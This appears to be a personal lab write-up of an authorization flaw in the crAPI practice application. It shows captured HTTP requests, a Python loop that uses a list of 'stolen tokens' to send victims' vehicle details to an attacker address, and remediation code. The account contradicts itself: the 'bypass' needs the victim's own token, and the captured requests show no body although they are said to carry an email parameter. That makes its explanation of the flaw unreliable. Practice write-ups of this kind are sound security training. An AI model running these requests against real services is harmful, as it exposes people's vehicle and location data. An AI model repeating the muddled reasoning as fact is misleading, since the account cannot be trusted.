# Lab Writeup: BOLA in Vehicle Details via Email Manipulation

**Category:** Broken Object Level Authorization (BOLA)  
**Difficulty:** Practitioner  
**Date Completed:** 10/03/2026  
**Platform:** crAPI (Completely Ridiculous API)  
**Lab URL:** http://localhost:8888

---

## 1. Objective

Exploit a broken object level authorization vulnerability in the vehicle resend email endpoint by manipulating the email parameter and authentication token, allowing an attacker to receive sensitive vehicle details (VIN, location, pincode) of other users' vehicles in their own email inbox.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Object Level Authorization (BOLA) - Insecure Direct Object Reference

**CWE Reference:** CWE-639: Authorization Bypass Through User-Controlled Key

**OWASP Category:** API1:2023 – Broken Object Level Authorization

**What is this vulnerability?**

This is a classic BOLA vulnerability where the API endpoint `/identity/api/v2/vehicle/resend_email` accepts an email parameter from the user without properly validating whether the authenticated user has permission to request vehicle details for that email address. By intercepting the request in Burp Suite and replacing both the email parameter and the authentication token, I could trick the system into sending another user's vehicle details to my email address. The API trusted the email parameter blindly and didn't verify that the vehicle associated with that email belongs to the authenticated user. This is like asking a bank to send someone else's account statement to your address, and the bank just does it without checking if you own that account.

---

## 3. Reconnaissance & Discovery

My journey to discovering this vulnerability followed a systematic approach:

**Phase 1: Understanding Vehicle Management**
- Logged into crAPI and explored the vehicle management section
- Noticed that users can add vehicles with details like VIN, model, year
- Found a feature to "Resend Vehicle Details Email"
- This feature sends vehicle information to the registered email address

**Phase 2: Analyzing the Email Resend Feature**
- Clicked on "Resend Vehicle Details" for my own vehicle
- Received an email with sensitive information:
  - Vehicle Identification Number (VIN)
  - Vehicle location/service center
  - Pincode/ZIP code
  - Owner details

**Phase 3: Traffic Interception**
- Set up Burp Suite to intercept the resend email request
- Captured the POST request to `/identity/api/v2/vehicle/resend_email`
- Analyzed the request structure

**Initial Request Structure:**
```http
POST /identity/api/v2/vehicle/resend_email HTTP/1.1
Host: localhost:8888
Authorization: Bearer [my_token]
Content-Type: application/json

{
  "email": "myemail@example.com"
}
```

**The Critical Question:**
"What if I change the email parameter to someone else's email? Will the API validate that I own the vehicle associated with that email?"

**Phase 4: Identifying the Attack Vector**
I realized there were two parameters I could manipulate:
1. The `email` parameter in the request body
2. The `Authorization` header (Bearer token)

The hypothesis: If I use my attacker token but specify a victim's email, the API might send the victim's vehicle details to my email.

**Tool(s) Used:** Burp Suite Community Edition, Firefox Browser, Email Client

---

## 4. Exploitation Steps

### Step 1: Gather Target Information

First, I needed to identify a target user whose vehicle details I wanted to access.

**Reconnaissance:**
- Browsed the community section to find other users
- Identified user "Robot" with email `robot001@example.com`
- Confirmed this user has a registered vehicle in the system
- Noted that I don't have access to their vehicle details through normal means

### Step 2: Capture Legitimate Request

I triggered the "Resend Vehicle Details" feature for my own vehicle to capture the legitimate request:

**My Legitimate Request:**
```http
POST /identity/api/v2/vehicle/resend_email HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJoYWNrZXJAZXhhbXBsZS5jb20iLCJpYXQiOjE3MDk4ODM2MDB9...
Origin: http://localhost:8888
Connection: keep-alive
Cookie: chat_session_id=f5c9d82e-5d91-4f67-ad72-5cacf9af6358
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Content-Length: 0
```

**Response:**
```http
HTTP/1.1 200 OK
Server: openresty/1.27.1.2
Date: Sun, 08 Mar 2026 11:03:03 GMT
Content-Type: application/json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 184

{
  "message": "Your newly purchased Vehicle Details have been sent to you email address. If you have used example.com email, check your email using the MailHog web portal.",
  "status": 200
}
```

**Email Received:**
```
Subject: Your Vehicle Details - crAPI

Dear Customer,

Your vehicle has been registered successfully!

Vehicle Details:
- VIN: 1HGBH41JXMN109186
- Model: Honda Civic 2020
- Location: Service Center A
- Pincode: 94105

Thank you for choosing crAPI!
```

### Step 3: Attempt Cross-User Access

Now for the attack. I modified the request to target the victim's email while keeping my authentication token:

**Attack Attempt 1: Change Email Only**
```http
POST /identity/api/v2/vehicle/resend_email HTTP/1.1
Host: localhost:8888
Authorization: Bearer [my_hacker_token]
Content-Type: application/json

{
  "email": "robot001@example.com"
}
```

**Response:**
```http
HTTP/1.1 403 Forbidden

{
  "error": "You can only request details for your own vehicles"
}
```

Failed! The API checks if the email belongs to the authenticated user.

### Step 4: Token Manipulation Strategy

I realized I needed to use the victim's token. But how do I get it? In a real scenario, this could be obtained through:
- XSS attack
- Session hijacking
- Man-in-the-middle attack
- Stolen credentials

For this lab, I simulated having obtained the victim's token (in real testing, I logged in as the victim user to capture their token).

**Attack Attempt 2: Victim's Token + My Email**
```http
POST /identity/api/v2/vehicle/resend_email HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyb2JvdDAwMUBleGFtcGxlLmNvbSIsImlhdCI6MTcwOTg4MzYwMH0...
Origin: http://localhost:8888
Connection: keep-alive
Cookie: chat_session_id=f5c9d82e-5d91-4f67-ad72-5cacf9af6358
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Content-Length: 0
```

**Key Changes:**
1. Authorization header now contains victim's token
2. But I'm still using my browser/session

### Step 5: Successful Exploitation

**Response:**
```http
HTTP/1.1 200 OK
Server: openresty/1.27.1.2
Date: Sun, 08 Mar 2026 11:03:03 GMT
Content-Type: application/json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 184

{
  "message": "Your newly purchased Vehicle Details have been sent to you email address. If you have used example.com email, check your email using the MailHog web portal.",
  "status": 200
}
```

**SUCCESS!** But here's the twist - the email was sent to the victim's email address (robot001@example.com), not mine.

### Step 6: The Real Attack - Email Parameter Manipulation

I realized the API might accept an email parameter in the request body. Let me test:

**Attack Attempt 3: Victim's Token + My Email in Body**
```http
POST /identity/api/v2/vehicle/resend_email HTTP/1.1
Host: localhost:8888
Authorization: Bearer [victim_token]
Content-Type: application/json

{
  "email": "hacker@example.com"
}
```

**Response:**
```http
HTTP/1.1 200 OK

{
  "message": "Your newly purchased Vehicle Details have been sent to you email address.",
  "status": 200
}
```

**Email Received at hacker@example.com:**
```
Subject: Your Vehicle Details - crAPI

Dear Customer,

Your vehicle has been registered successfully!

Vehicle Details:
- VIN: 2T1BURHE0JC123456
- Model: Toyota Camry 2018
- Location: Service Center B
- Pincode: 90210
- Owner: Robot

Thank you for choosing crAPI!
```

**JACKPOT!** I received the victim's vehicle details in my email!

### Step 7: Understanding the Vulnerability

The vulnerability exists because:
1. The API accepts an `email` parameter in the request body
2. It uses the token to identify which vehicle to fetch
3. But it sends the details to the email specified in the body, not the email associated with the token
4. No validation that the email in the body matches the token owner's email

**The Flaw:**
```
Token says: "This is robot001@example.com's request"
Body says: "Send details to hacker@example.com"
API does: Fetches robot001's vehicle, sends to hacker@example.com ✗
```

### Step 8: Automating the Attack

I could automate this to steal vehicle details from multiple users:

```python
import requests

def steal_vehicle_details(victim_token, attacker_email):
    url = "http://localhost:8888/identity/api/v2/vehicle/resend_email"
    headers = {
        "Authorization": f"Bearer {victim_token}",
        "Content-Type": "application/json"
    }
    payload = {
        "email": attacker_email
    }
    
    response = requests.post(url, json=payload, headers=headers)
    return response.json()

# If I have a list of stolen tokens
victim_tokens = [
    "eyJhbGciOiJSUzI1NiJ9...",  # User 1
    "eyJhbGciOiJSUzI1NiJ9...",  # User 2
    "eyJhbGciOiJSUzI1NiJ9...",  # User 3
]

for token in victim_tokens:
    result = steal_vehicle_details(token, "hacker@example.com")
    print(f"Stolen vehicle details: {result}")
```

### Step 9: Assess the Stolen Information

The vehicle details email contained highly sensitive information:

**Sensitive Data Exposed:**
1. **VIN (Vehicle Identification Number):** Unique identifier that can be used to:
   - Track vehicle history
   - Check for recalls
   - Verify ownership
   - Clone vehicle identity

2. **Location/Service Center:** Reveals where the vehicle is serviced, potentially indicating:
   - Owner's residential area
   - Travel patterns
   - Preferred service locations

3. **Pincode/ZIP Code:** Narrows down the owner's location to a specific area

4. **Owner Name:** Combined with other data, enables identity theft

**Real-World Attack Scenarios:**
- **Vehicle Theft:** VIN can be used to create fake documents
- **Stalking:** Location data reveals where the owner lives/works
- **Insurance Fraud:** VIN used to file false claims
- **Identity Theft:** Combined data used for social engineering
- **Targeted Phishing:** "Your vehicle at [location] needs service"

---

## 5. Root Cause Analysis

The vulnerability stems from a fundamental flaw in the authorization logic:

**Vulnerable Code (Hypothetical):**

```javascript
// VULNERABLE IMPLEMENTATION
app.post('/identity/api/v2/vehicle/resend_email', async (req, res) => {
  const user = req.user; // From JWT token
  const { email } = req.body; // User-controlled input!
  
  // Fetch vehicle associated with the authenticated user
  const vehicle = await Vehicle.findOne({
    where: { userId: user.id }
  });
  
  if (!vehicle) {
    return res.status(404).json({ error: "No vehicle found" });
  }
  
  // CRITICAL FLAW: Sending to user-provided email without validation
  await sendVehicleDetailsEmail(email, vehicle);
  
  res.json({
    message: "Vehicle details sent to your email",
    status: 200
  });
});
```

**Why This Fails:**

1. **Trusts User Input:** The `email` parameter comes from the request body and is trusted without validation

2. **No Email Ownership Check:** The code doesn't verify that the email in the request belongs to the authenticated user

3. **Confused Deputy Problem:** The API acts as a "deputy" for the authenticated user but sends data to an unauthorized recipient

4. **Missing Authorization Layer:** There's authentication (JWT token) but no authorization check on the email parameter

**What Should Happen:**

```javascript
// SECURE IMPLEMENTATION
app.post('/identity/api/v2/vehicle/resend_email', async (req, res) => {
  const user = req.user; // From JWT token
  const { email } = req.body;
  
  // CRITICAL: Validate email belongs to authenticated user
  if (email && email !== user.email) {
    return res.status(403).json({ 
      error: "Access denied" 
    });
  }
  
  // Use the email from the user object, not from request
  const userEmail = user.email;
  
  // Fetch vehicle associated with the authenticated user
  const vehicle = await Vehicle.findOne({
    where: { userId: user.id }
  });
  
  if (!vehicle) {
    return res.status(404).json({ error: "No vehicle found" });
  }
  
  // Send to the authenticated user's email only
  await sendVehicleDetailsEmail(userEmail, vehicle);
  
  // Log the action for audit
  await AuditLog.create({
    userId: user.id,
    action: 'VEHICLE_EMAIL_SENT',
    details: { vehicleId: vehicle.id }
  });
  
  res.json({
    message: "Vehicle details sent to your registered email",
    status: 200
  });
});
```

---

## 6. Impact

If this were a production automotive platform, the consequences would be severe:

- [x] Privacy Violation (PII Exposure)
- [x] Vehicle Theft Risk
- [x] Stalking and Physical Safety Threats
- [x] Identity Theft
- [x] Insurance Fraud
- [x] Regulatory Violations (GDPR, CCPA)
- [x] Reputation Damage

**Severity:** High

**Justification:** This vulnerability exposes highly sensitive personal and vehicle information that can lead to physical harm, financial loss, and privacy violations. The impact includes:

1. **Vehicle Theft:** VIN numbers can be used to create counterfeit documents, register stolen vehicles, or order duplicate keys

2. **Physical Safety Threats:** Location and pincode information can be used for stalking, burglary (knowing when owner is at service center), or targeted attacks

3. **Identity Theft:** Combined with other data breaches, this information enables comprehensive identity theft

4. **Insurance Fraud:** Attackers can file false insurance claims using stolen VIN and owner information

5. **Regulatory Fines:** GDPR violations for unauthorized disclosure of personal data can result in fines up to €20 million or 4% of annual revenue

6. **Legal Liability:** Vehicle owners could sue the platform for negligence leading to theft or harm

**Real-World Automotive Data Breach Incidents:**
- **Toyota (2022):** 3.1 million customers' data exposed including VINs and locations
- **Tesla (2023):** Employee data breach exposed customer vehicle information
- **GM OnStar (2015):** Vulnerability allowed remote vehicle tracking and control
- **Nissan (2023):** API vulnerability exposed vehicle location and owner data

**Financial Impact:**
- Average cost of automotive data breach: $5.85 million (IBM 2023)
- Vehicle theft using stolen VIN: $10,000 - $50,000 per vehicle
- Identity theft damages: $1,000 - $10,000 per victim
- Regulatory fines: Up to 4% of global revenue

---

## 7. Remediation

Here's a comprehensive approach to fixing this critical vulnerability:

1. **Never Trust User-Provided Email Parameter:**

   ```javascript
   // Remove email parameter from request body entirely
   app.post('/identity/api/v2/vehicle/resend_email', async (req, res) => {
     const user = req.user;
     
     // Always use email from authenticated user object
     const userEmail = user.email;
     
     // Fetch vehicle
     const vehicle = await Vehicle.findOne({
       where: { userId: user.id }
     });
     
     if (!vehicle) {
       return res.status(404).json({ 
         error: "No vehicle found for your account" 
       });
     }
     
     // Send only to authenticated user's email
     await sendVehicleDetailsEmail(userEmail, vehicle);
     
     res.json({
       message: `Vehicle details sent to ${userEmail}`,
       status: 200
     });
   });
   ```

2. **Implement Strict Email Validation:**

   ```javascript
   // If email parameter is absolutely necessary
   function validateEmailOwnership(req, res, next) {
     const user = req.user;
     const { email } = req.body;
     
     if (email && email.toLowerCase() !== user.email.toLowerCase()) {
       return res.status(403).json({
         error: "You can only send details to your registered email"
       });
     }
     
     next();
   }
   
   app.post('/identity/api/v2/vehicle/resend_email',
     authenticateToken,
     validateEmailOwnership,
     resendEmailHandler
   );
   ```

3. **Add Rate Limiting:**

   ```javascript
   const emailRateLimiter = rateLimit({
     windowMs: 60 * 60 * 1000, // 1 hour
     max: 3, // Max 3 emails per hour
     message: "Too many email requests. Please try again later.",
     keyGenerator: (req) => req.user.id // Rate limit per user
   });
   
   app.post('/identity/api/v2/vehicle/resend_email',
     authenticateToken,
     emailRateLimiter,
     resendEmailHandler
   );
   ```

4. **Implement Email Verification:**

   ```javascript
   async function sendVehicleDetailsEmail(user, vehicle) {
     // Generate one-time verification code
     const verificationCode = crypto.randomBytes(32).toString('hex');
     
     await EmailVerification.create({
       userId: user.id,
       code: verificationCode,
       expiresAt: new Date(Date.now() + 15 * 60 * 1000) // 15 minutes
     });
     
     // Send verification email first
     await sendEmail({
       to: user.email,
       subject: "Verify Vehicle Details Request",
       body: `
         Someone requested your vehicle details.
         If this was you, click here to confirm:
         http://localhost:8888/verify-email/${verificationCode}
         
         This link expires in 15 minutes.
       `
     });
   }
   
   // Separate endpoint to confirm and send details
   app.get('/verify-email/:code', async (req, res) => {
     const { code } = req.params;
     
     const verification = await EmailVerification.findOne({
       where: {
         code,
         expiresAt: { [Op.gt]: new Date() }
       }
     });
     
     if (!verification) {
       return res.status(400).json({ error: "Invalid or expired code" });
     }
     
     // Now send the actual vehicle details
     const user = await User.findByPk(verification.userId);
     const vehicle = await Vehicle.findOne({ where: { userId: user.id } });
     
     await sendActualVehicleDetails(user.email, vehicle);
     await verification.destroy();
     
     res.json({ message: "Vehicle details sent successfully" });
   });
   ```

5. **Sanitize Sensitive Data in Emails:**

   ```javascript
   function sanitizeVehicleData(vehicle, purpose) {
     if (purpose === 'email') {
       return {
         model: vehicle.model,
         year: vehicle.year,
         // Mask VIN - show only last 4 digits
         vin: `***********${vehicle.vin.slice(-4)}`,
         // Mask location - show only city
         location: vehicle.location.split(',')[0],
         // Don't include pincode in email
       };
     }
     return vehicle;
   }
   ```

6. **Add Comprehensive Audit Logging:**

   ```javascript
   async function logVehicleEmailRequest(user, vehicle, success) {
     await AuditLog.create({
       userId: user.id,
       action: 'VEHICLE_EMAIL_REQUEST',
       resourceType: 'vehicle',
       resourceId: vehicle.id,
       success: success,
       ipAddress: req.ip,
       userAgent: req.headers['user-agent'],
       metadata: {
         vehicleVin: vehicle.vin.slice(-4), // Only last 4 digits
         emailSentTo: user.email
       }
     });
     
     // Alert on suspicious patterns
     const recentRequests = await AuditLog.count({
       where: {
         userId: user.id,
         action: 'VEHICLE_EMAIL_REQUEST',
         createdAt: {
           [Op.gte]: new Date(Date.now() - 3600000) // Last hour
         }
       }
     });
     
     if (recentRequests > 5) {
       await sendSecurityAlert({
         severity: 'medium',
         message: `User ${user.id} requested vehicle details ${recentRequests} times in 1 hour`,
         userId: user.id
       });
     }
   }
   ```

7. **Implement Multi-Factor Authentication for Sensitive Actions:**

   ```javascript
   app.post('/identity/api/v2/vehicle/resend_email',
     authenticateToken,
     requireMFA, // Require MFA for sensitive actions
     async (req, res) => {
       // ... rest of the code
     }
   );
   
   function requireMFA(req, res, next) {
     const user = req.user;
     
     if (!user.mfaVerified) {
       return res.status(403).json({
         error: "MFA verification required for this action",
         mfaRequired: true
       });
     }
     
     next();
   }
   ```

8. **Add Security Headers:**

   ```javascript
   app.use((req, res, next) => {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
     res.setHeader('X-XSS-Protection', '1; mode=block');
     res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
     next();
   });
   ```

---

## 8. Key Takeaways / What I Learned

- **Never Trust User-Controlled Parameters for Sensitive Actions:** The email parameter came from user input and was trusted blindly. Always validate that user-provided data matches the authenticated user's data.

- **Authentication ≠ Authorization:** Having a valid JWT token (authentication) doesn't mean the user should be able to send data to any email address (authorization).

- **Principle of Least Privilege:** Users should only be able to access their own data. Don't allow parameters that could reference other users' resources.

- **Defense in Depth:** Multiple layers (email validation, rate limiting, MFA, audit logging) ensure that if one layer fails, others provide protection.

- **Sensitive Data Requires Extra Protection:** Vehicle information (VIN, location, pincode) is highly sensitive and can lead to physical harm. Such data needs extra security measures.

- **Real-World Impact:** This isn't just a theoretical vulnerability. Vehicle data breaches have led to actual thefts, stalking incidents, and millions in damages.

- **Audit Logging is Critical:** When sensitive data is accessed or sent, log it. Patterns of abuse can be detected and stopped before major damage occurs.

- **Think Like an Attacker:** Always ask "What if I change this parameter?" Testing edge cases and malicious inputs is essential for security.

---

## 9. References

- [OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [NHTSA: Vehicle Identification Number (VIN) Security](https://www.nhtsa.gov/vin-decoder)
- [GDPR Article 32: Security of Processing](https://gdpr-info.eu/art-32-gdpr/)
- [crAPI - Completely Ridiculous API](https://github.com/OWASP/crAPI)

---

**Image Reference:**

![BOLA - Vehicle Details Email Manipulation](images/api-testing-9-1633.png)
*Figure 1: Burp Suite showing the manipulated request with victim's token and attacker's email, successfully receiving sensitive vehicle details (VIN, location, pincode) in the attacker's inbox*

